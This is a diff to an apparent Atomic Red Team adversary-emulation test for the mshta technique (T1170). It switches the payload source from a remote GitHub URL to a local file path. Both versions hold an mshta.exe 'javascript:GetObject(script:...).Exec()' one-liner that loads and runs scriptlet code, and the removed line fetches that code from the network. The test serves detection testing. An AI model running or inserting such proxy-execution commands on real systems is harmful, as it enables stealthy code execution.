@@ -9,12 +9,11 @@ atomic_tests:
   supported_platforms:
     - windows
   input_arguments:
-    file_url:
+    file_path:
       description: location of the payload
-      type: Url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct
+      type: Path
+      default: C:/AtomicRedTeam/atomics/T1170/mshta.sct
   executor:
-    name: command_prompt
+    name: powershell
     command: |
-      mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
-      
+      mshta.exe javascript:a=(GetObject('script:#{file_path}')).Exec();close();
